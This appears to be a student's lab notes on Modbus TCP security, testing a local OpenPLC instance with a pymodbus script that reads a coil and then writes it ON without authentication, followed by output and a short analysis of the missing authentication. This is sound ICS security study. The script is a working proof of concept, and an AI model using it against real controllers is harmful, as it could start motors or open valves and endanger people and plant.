# Day 2 - Modbus Read/Write with Python (pymodbus)

## Environment Setup
```bash
cd ~/Desktop/OpenPLC_v3
source venv/bin/activate
sudo apt update
pip install --upgrade pymodbus

Script: pymodbus_test.py:
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient(host='127.0.0.1', port=502)
client.connect()

# Read coil at address 0
result = client.read_coils(address=0, count=1)
print(f"Coil 0 status: {result.bits[0]}")

# Unauthorized write to coil at address 0
client.write_coil(address=0, value=True)
print(f"Write ON success. After write, coil 0 status: {client.read_coils(address=0, count=1).bits[0]}")

client.close()
Run:
  python pymodbus_test.py
Output:
  Coil 0 status: False
  Write ON success. After write, coil 0 status: True
Analysis:
    The write operation was performed without any authentication

    This proves the Modbus device has unauthorized write vulnerability

    Attackers could remotely control industrial equipment (start/stop motors, open/close valves)
Key learnings:
    read_coils(address, count) → Function code 0x01

    write_coil(address, value) → Function code 0x05

    No password/authentication in standard Modbus TCP
